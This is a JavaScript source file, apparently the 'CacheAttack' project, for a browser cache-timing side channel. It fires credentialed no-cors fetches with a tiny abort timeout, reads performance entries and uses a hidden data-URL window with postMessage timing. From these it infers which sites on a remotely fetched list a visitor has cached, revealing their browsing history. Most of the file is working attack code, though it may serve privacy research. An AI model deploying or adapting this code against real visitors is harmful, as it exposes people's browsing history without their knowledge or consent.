/*jshint esversion: 8 */

// NDev 2020 https://github.com/NDevTK/CacheAttack
const firefox = navigator.userAgent.includes("Firefox");
const redirect = "data:text/html;charset=utf-8;base64,PHRpdGxlPkNhY2hlQXR0YWNrIFdvcmtlcjwvdGl0bGU+DQo8aDE+Q2FjaGVBdHRhY2sgV29ya2VyPC9oMT4NCjxwMT5UaGlzIHdpbmRvdyBpcyB1c2VkIGZvciBjYWNoZSBjaGVja2luZy48L3AxPg0KPHNjcmlwdCBzcmM9Imh0dHBzOi8vbmRldi50ay9taXJyb3IvSGFja1RpbWVyL0hhY2tUaW1lci5taW4uanMiPjwvc2NyaXB0Pg0KPHNjcmlwdD4NCm1heCA9IChuYXZpZ2F0b3IudXNlckFnZW50LmluY2x1ZGVzKCJGaXJlZm94IikpID8gMTAgOiAzMDsNCmNhY2hlZCA9IHRydWU7DQoNCndpbmRvdy5hZGRFdmVudExpc3RlbmVyKCJtZXNzYWdlIiwgZnVuY3Rpb24oZXZlbnQpIHsgIA0KICBpZighZXZlbnQuZGF0YS5zdGFydHNXaXRoKCJodHRwczovLyIpIHx8IGV2ZW50Lm9yaWdpbiAhPT0gImh0dHBzOi8vY2FjaGUubmRldi50ayIpIHJldHVybg0KICBzZXRUaW1lb3V0KF8gPT4gew0KICAgIGNhY2hlZCA9IGZhbHNlOw0KICAgIHdpbmRvdy5sb2NhdGlvbi5yZWxvYWQoKTsNCiAgfSwgbWF4KTsNCiAgd2luZG93LmxvY2F0aW9uID0gZXZlbnQuZGF0YTsNCn0pOw0KICANCndpbmRvdy5hZGRFdmVudExpc3RlbmVyKCJwYWdlaGlkZSIsIGV2ZW50ID0+IHsNCiAgd2luZG93Lm9wZW5lci5wb3N0TWVzc2FnZShjYWNoZWQpOw0KfSk7DQogIA0Kd2luZG93LmFkZEV2ZW50TGlzdGVuZXIoJ2xvYWQnLCAoZXZlbnQpID0+IHsNCiAgd2luZG93Lm9wZW5lci5wb3N0TWVzc2FnZSgibG9hZCIpOw0KfSk7DQo8L3NjcmlwdD4=";
const max = 10.5;

if (self.document === undefined) {
    onmessage = async e => {
        await ifCachedWorker(e.data, result => postMessage(result));
        postMessage("done");
    };
}

async function getWebsites(cb = false, websites = null, worker = true, CacheTest = false) {
    if (CacheTest) {
        let TestResult = await ifCached_test();
        if (!TestResult) {
            console.error("CacheAttack failed");
            return [];
        }
    }
    var output = [];
    cb = (cb) ? cb : item => output.push(item);
    if (websites === null) {
        websites = await getRules();
    }
    if(worker) {
        let checks = chunk(websites, Math.ceil(websites.length / navigator.hardwareConcurrency));
        await PromiseForeach(checks, async chunk => {
            let worker = new Worker("https://cache.ndev.tk/embed.js");
            worker.postMessage(chunk);
            await new Promise(resolve => {
                worker.onmessage = e => {
                    if (e.data === "done") {
                        resolve();
                        return
                    }
                    cb(e.data);
                };
            });
            worker.terminate();
        }, 600);
    } else {
        await ifCachedWorker(websites, cb);
    }
    return [...new Set(output)];
}

async function PromiseForeach(item, callback, delay = 0) {
    var jobs = [];
    for (let x of item) {
        await new Promise(resolve => setTimeout(resolve, delay));
        jobs.push(callback(x));
    }
    await Promise.all(jobs);
}

function chunk(array, size) {
    const chunked_arr = [];
    for (let i = 0; i < array.length; i++) {
        const last = chunked_arr[chunked_arr.length - 1];
        if (!last || last.length === size) {
            chunked_arr.push([array[i]]);
        } else {
            last.push(array[i]);
        }
    }
    return chunked_arr;
}

async function getRules() {
    let req = await fetch("https://cache.ndev.tk/rules");
    var body = await req.json();
    return body;
}

function is304(res) {
    if (res.encodedBodySize > 0 &&
        res.transferSize > 0 &&
        res.transferSize < res.encodedBodySize) {
        return true;
    }
    return null;
}

function PerformanceCheck(url) {
    var res = performance.getEntriesByName(url).pop();
    if (res === undefined) return null;
    if (is304(res)) return true;
    return (res.transferSize !== 0);
}

async function ifCachedWorker(websites, cb) {
    // Foreach website check if cached
    for (let website of websites) {
        let result = await ifCached(website[0]);
        if (result) {
            cb(website);
        }
    }
}

async function ifCached_test() {
    let cache_test = "https://ndev.tk/README.md?".concat(Math.random());
    let result = await ifCached(cache_test);
    await fetch("https://ndev.tk/README.md");
    let result2 = await ifCached("https://ndev.tk/README.md");
    return (!result && result2);
}

// Will include credentials so please use a sandbox domain or my postMessage API
async function ifCached(url) {
    var state = true;
    var controller = new AbortController();
    var signal = controller.signal;
    var timeout = await setTimeout(_ => { // Stop request after max
        controller.abort();
        state = false;
    }, max);
    try {
        await fetch(url, {mode: "no-cors",credentials: "include",signal});
    } catch (err) {
        // Website blocked by client
        clearTimeout(timeout);
    }
    clearTimeout(timeout);
    return state;
}

function WindowEvent(check = false) {
    return new Promise(resolve => {
        window.addEventListener('message', e => {
            if (check !== false && e.data !== check) return;
            resolve(e.data);
        });
    });
}

function initChecker() {
    checker = open(redirect);
}

// Currently fails if not in loop
async function ifCached_window(url) {
    checker.postMessage(url);
    let event = await WindowEvent();
    if (event === "load") {
        return console.log("Wrong state");
    }
    if (event) {
        checker.location = window;
    }
    await WindowEvent("load");
    if (firefox) await new Promise(resolve => setTimeout(resolve, 50));
    return event;
}

async function block(url) {
    for (;;) {
        if (checker.closed) location.reload();
        checker.postMessage(url[0]);
        checker.location = redirect;
        await WindowEvent();
    }
}

function blockerFrame(url) {
    if (document.getElementById("ifrm")) {
        ifrm.src = redirect;
        return;
    }
    var ifrm = document.createElement("iframe");
    ifrm.setAttribute("src", url);
    ifrm.id = "ifrm";
    ifrm.hidden = true;
    document.body.appendChild(ifrm);
}
